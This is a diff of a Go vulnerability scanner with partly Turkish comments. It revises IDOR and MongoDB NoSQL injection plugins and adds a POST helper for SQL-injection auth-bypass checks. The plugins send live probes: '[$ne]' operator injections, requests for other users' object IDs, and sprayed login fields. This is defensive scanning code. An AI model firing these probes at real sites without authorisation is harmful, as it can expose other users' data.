 type IDORPlugin struct{}
 
-func (p *IDORPlugin) Name() string { return "IDOR / Broken Object Level Auth (Pro)" }
+func (p *IDORPlugin) Name() string { return "IDOR (Smart Pattern Check)" }
 
 func (p *IDORPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -2112,105 +2157,64 @@ func (p *IDORPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	client := getClient()
+	baseURL := getURL(target, "")
 
-	// List of potential endpoints vulnerable to IDOR.
-	// We use standard placeholders {ID} to swap numbers dynamically.
+	// IDOR olabilecek yaygın patternler
 	patterns := []string{
 		"/profile?id={ID}",
 		"/users/{ID}",
 		"/api/v1/user/{ID}",
-		"/orders/{ID}",
+		"/my-account?uid={ID}",
+		"/order/view/{ID}",
 		"/invoice?id={ID}",
-		"/account/settings/{ID}",
+		"/tickets/{ID}",
+		"/messages/{ID}",
 	}
 
 	for _, pattern := range patterns {
-		// 1. BASELINE REQUEST (ID=1)
-		// We assume ID=1 often exists (admin or first user).
-		urlBase := getURL(target, strings.Replace(pattern, "{ID}", "1", 1))
-		respBase, err := client.Get(urlBase)
+		// 1. BASELINE (ID=1) - Genelde Admin veya ilk kullanıcı
+		endpointBase := strings.Replace(pattern, "{ID}", "1", 1)
+		respBase, err := client.Get(baseURL + endpointBase)
 		if err != nil || respBase.StatusCode != 200 {
-			continue // Endpoint likely doesn't exist or is protected.
+			continue
 		}
 
 		bodyBase, _ := io.ReadAll(respBase.Body)
 		respBase.Body.Close()
 		lenBase := len(bodyBase)
 
-		// 2. SOFT-404 CHECK (ID=999999)
-		// We verify if the server returns 200 OK for non-existent resources.
-		// If it does, we must ensure our "Target" request looks different from this error page.
-		urlNoise := getURL(target, strings.Replace(pattern, "{ID}", "999999", 1))
-		respNoise, err := client.Get(urlNoise)
-
-		isSoft404 := false
-		lenNoise := 0
-
-		if err == nil {
-			bodyNoise, _ := io.ReadAll(respNoise.Body)
-			respNoise.Body.Close()
-			lenNoise = len(bodyNoise)
-
-			// If the non-existent page returns 200 OK, we check similarity.
-			if respNoise.StatusCode == 200 {
-				// Calculate difference ratio. If lengths are very close (within 5%), it's likely a generic page.
-				diff := float64(lenBase - lenNoise)
-				if diff < 0 {
-					diff = -diff
-				} // Absolute value
-
-				// If the baseline and the noise (error) page are identical in size,
-				// the server is just returning a static "200 OK" for everything. Skip it.
-				if diff < float64(lenBase)*0.05 {
-					continue
-				}
-				isSoft404 = true
-			}
-		}
-
-		// 3. TARGET REQUEST (ID=2)
-		// Now we try to access another valid resource.
-		urlTarget := getURL(target, strings.Replace(pattern, "{ID}", "2", 1))
-		respTarget, err := client.Get(urlTarget)
+		// 2. TARGET (ID=2) - Başka bir kullanıcı
+		endpointTarget := strings.Replace(pattern, "{ID}", "2", 1)
+		respTarget, err := client.Get(baseURL + endpointTarget)
 
 		if err == nil {
 			defer respTarget.Body.Close()
 			bodyTarget, _ := io.ReadAll(respTarget.Body)
 			lenTarget := len(bodyTarget)
 
-			// LOGIC:
-			// 1. Must be 200 OK.
-			// 2. If we detected a Soft-404 (fake 200), the Target must NOT look like the Soft-404 page.
-			// 3. The Target should look somewhat similar to the Baseline (ID=1) structurally.
+			// 3. NOISE CHECK (ID=99999) - Olmayan Sayfa
+			endpointNoise := strings.Replace(pattern, "{ID}", "999999", 1)
+			respNoise, _ := client.Get(baseURL + endpointNoise)
+			lenNoise := 0
+			if respNoise != nil {
+				b, _ := io.ReadAll(respNoise.Body)
+				lenNoise = len(b)
+				respNoise.Body.Close()
+			}
 
-			if respTarget.StatusCode == 200 {
+			// ANALİZ MANTIĞI:
+			// ID=1 ve ID=2 farklı boyutlarda olmalı (Farklı kullanıcı) ama Hata sayfasından da farklı olmalı.
+			isDifferentFromNoise := math.Abs(float64(lenTarget-lenNoise)) > float64(lenNoise)*0.1
 
-				// Check against Soft-404 noise
-				if isSoft404 {
-					diffNoise := float64(lenTarget - lenNoise)
-					if diffNoise < 0 {
-						diffNoise = -diffNoise
-					}
-
-					// If Target looks like the Error Page, it's not a vulnerability.
-					if diffNoise < float64(lenNoise)*0.05 {
-						continue
-					}
-				}
-
-				// If we reached here:
-				// ID=1 exists (200).
-				// ID=999999 is either 404 or significantly different.
-				// ID=2 exists (200) and is different from the error page.
-
+			if respTarget.StatusCode == 200 && isDifferentFromNoise {
 				return &Vulnerability{
 					Target:      target,
-					Name:        "Potential IDOR / BOLA",
-					Severity:    "MEDIUM", // Can be High, but requires verification.
-					CVSS:        6.5,
-					Description: fmt.Sprintf("Broken Object Level Authorization suspected.\nEndpoint: %s\n- ID=1 (Baseline): %d bytes\n- ID=2 (Target): %d bytes\n- ID=999999 (Noise): %d bytes\n\nThe server returns valid content for sequential IDs without apparent authentication checks.", pattern, lenBase, lenTarget, lenNoise),
-					Solution:    "Implement strict access controls. Verify that the logged-in user has permission to access the requested object ID.",
-					Reference:   "OWASP API Security Top 10: Broken Object Level Authorization",
+					Name:        "Potential IDOR Found",
+					Severity:    "HIGH",
+					CVSS:        7.5,
+					Description: fmt.Sprintf("Access to different user objects detected without auth error.\nEndpoint: %s\nID=1 Size: %d\nID=2 Size: %d\nID=999999 (Error) Size: %d", pattern, lenBase, lenTarget, lenNoise),
+					Solution:    "Implement strict access controls checks for object IDs.",
+					Reference:   "OWASP Broken Access Control",
 				}
 			}
 		}
@@ -3183,10 +3187,10 @@ func (p *CitrixPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 78. NOSQL INJECTION (V2 - PRO: DIFFERENTIAL ANALYSIS)
+// 78. NOSQL INJECTION (V2.1 - SMART DIFFERENTIAL)
 type NoSQLPlugin struct{}
 
-func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB - Pro)" }
+func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB - Smart)" }
 
 func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
@@ -3194,56 +3198,46 @@ func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
 	}
 
 	client := getClient()
+	baseURL := getURL(target, "")
 
-	// Common parameters that might interact with a database
-	params := []string{"id", "user", "username", "q", "search", "query"}
+	endpoints := []string{"/", "/login", "/api/users", "/search"}
+	params := []string{"user", "username", "password", "code", "token", "q"}
 
-	for _, param := range params {
-		// STEP 1: Baseline Request (Negative Test)
-		// We ask for a value that definitely doesn't exist.
-		// Expected: Empty result, small page size, or 404.
-		dummyVal := "dorm_nosql_check_99999"
-		urlBase := getURL(target, fmt.Sprintf("/?%s=%s", param, dummyVal))
+	for _, ep := range endpoints {
+		for _, param := range params {
+			// 1. BASELINE (Normal İstek - Boş veya Rastgele)
+			urlBase := fmt.Sprintf("%s%s?%s=dorm_check_999", baseURL, ep, param)
+			respBase, err := client.Get(urlBase)
+			if err != nil {
+				continue
+			}
 
-		respBase, err := client.Get(urlBase)
-		if err != nil {
-			continue
-		}
+			bodyBase, _ := io.ReadAll(respBase.Body)
+			respBase.Body.Close()
+			lenBase := len(bodyBase)
 
-		bodyBase, _ := io.ReadAll(respBase.Body)
-		respBase.Body.Close()
-		lenBase := len(bodyBase)
+			// 2. ATTACK ([$ne] Operatörü - "Eşit Değildir")
+			// Eğer site açıksa, "dorm_check_999"a eşit olmayan HER ŞEYİ (tüm veritabanını) döndürür.
+			// Bu da sayfa boyutunu şişirir.
+			urlAttack := fmt.Sprintf("%s%s?%s[$ne]=dorm_check_999", baseURL, ep, param)
 
-		// STEP 2: Injection Request (Logical Operator)
-		// We use the MongoDB operator [$ne] (Not Equal).
-		// Query: "Give me everything where param is NOT equal to dummyVal".
-		// Expected: If vulnerable, this returns ALL records (DB Dump), causing a massive size increase.
-		urlAttack := getURL(target, fmt.Sprintf("/?%s[$ne]=%s", param, dummyVal))
+			respAttack, err := client.Get(urlAttack)
+			if err == nil {
+				defer respAttack.Body.Close()
+				bodyAttack, _ := io.ReadAll(respAttack.Body)
+				lenAttack := len(bodyAttack)
 
-		respAttack, err := client.Get(urlAttack)
-		if err == nil {
-			defer respAttack.Body.Close()
-			bodyAttack, _ := io.ReadAll(respAttack.Body)
-			lenAttack := len(bodyAttack)
-
-			// LOGIC:
-			// 1. Attack must be 200 OK.
-			// 2. The attack response size must be significantly larger than the baseline.
-			//    We use a factor of 2x or a minimum byte difference (e.g., 500 bytes) to avoid noise.
-
-			sizeDiff := lenAttack - lenBase
-			isLarger := lenAttack > (lenBase * 2) // At least double the size?
-			isSignificant := sizeDiff > 500       // At least 500 bytes of extra data?
-
-			if respAttack.StatusCode == 200 && (isLarger || isSignificant) {
-				return &Vulnerability{
-					Target:      target,
-					Name:        "NoSQL Injection (MongoDB)",
-					Severity:    "HIGH",
-					CVSS:        8.2,
-					Description: fmt.Sprintf("MongoDB Injection detected via operator manipulation.\nParameter: %s\nBaseline Size: %d bytes\nInjection Size: %d bytes\n\nThe query '[$ne]' (Not Equal) forced the database to return more data than expected.", param, lenBase, lenAttack),
-					Solution:    "Sanitize inputs and avoid passing query parameters directly to the database engine. Use type casting.",
-					Reference:   "OWASP NoSQL Injection",
+				// Eşik Değeri: Saldırı cevabı, normal cevaptan belirgin şekilde büyük mü?
+				if respAttack.StatusCode == 200 && lenAttack > (lenBase+500) {
+					return &Vulnerability{
+						Target:      target,
+						Name:        "NoSQL Injection (MongoDB)",
+						Severity:    "HIGH",
+						CVSS:        8.2,
+						Description: fmt.Sprintf("MongoDB Injection detected via size difference.\nParam: %s\nBaseline Size: %d\nAttack Size: %d", param, lenBase, lenAttack),
+						Solution:    "Sanitize inputs and avoid passing query parameters directly.",
+						Reference:   "OWASP NoSQL Injection",
+					}
 				}
 			}
 		}
@@ -3414,6 +3408,48 @@ func (p *ShadowAPIPlugin) Run(target ScanTarget) *Vulnerability {
 }
 
 // ==========================================
+// HELPER FOR SQL INJECTION (POST)
+// ==========================================
+
+// getPostResponseLength sends a POST request with credentials and returns body size.
+// This is used to detect Auth Bypass (e.g. if size changes drastically).
+func getPostResponseLength(client *http.Client, urlStr, user, pass string) (int, error) {
+	data := url.Values{}
+
+	// Fuzz common field names to ensure we hit the right input
+	data.Set("username", user)
+	data.Set("user", user)
+	data.Set("email", user)
+	data.Set("login", user)
+	data.Set("txtUser", user) // ASP.NET specific
+
+	data.Set("password", pass)
+	data.Set("pass", pass)
+	data.Set("txtPassword", pass) // ASP.NET specific
+
+	// Create the POST request
+	req, err := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode()))
+	if err != nil {
+		return 0, err
+	}
+
+	// Essential Headers
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "DORM-Scanner/Enterprise")
+
+	// Execute
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0, err
+	}
+	defer resp.Body.Close()
+
+	// Measure Response Size
+	bodyBytes, _ := io.ReadAll(resp.Body)
+	return len(bodyBytes), nil
+}
+
+// ==========================================
 // INVENTORY LIST FOR UI
 // ==========================================
 func GetPluginInventory() []string {
@@ -3434,7 +3470,6 @@ func GetPluginInventory() []string {
 		"Memcached Stats", "Anonymous FTP", "SMTP Open Relay", "API Key in JS Files", "Subdomain Takeover Risk",
 		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
 		"SSRF Cloud Metadata", "JWT None Algorithm", "Apache Struts RCE", "Citrix ADC Traversal", "NoSQL Injection (MongoDB)", "Atlassian Confluence RCE",
-		"Terraform State Exposure", "WebSocket Hijacking", "TeamCity Auth Bypass", "Shadow API Discovery", "Fuzer" ,
+		"Terraform State Exposure", "WebSocket Hijacking", "TeamCity Auth Bypass", "Shadow API Discovery", "Fuzzer",
 	}
 }
-
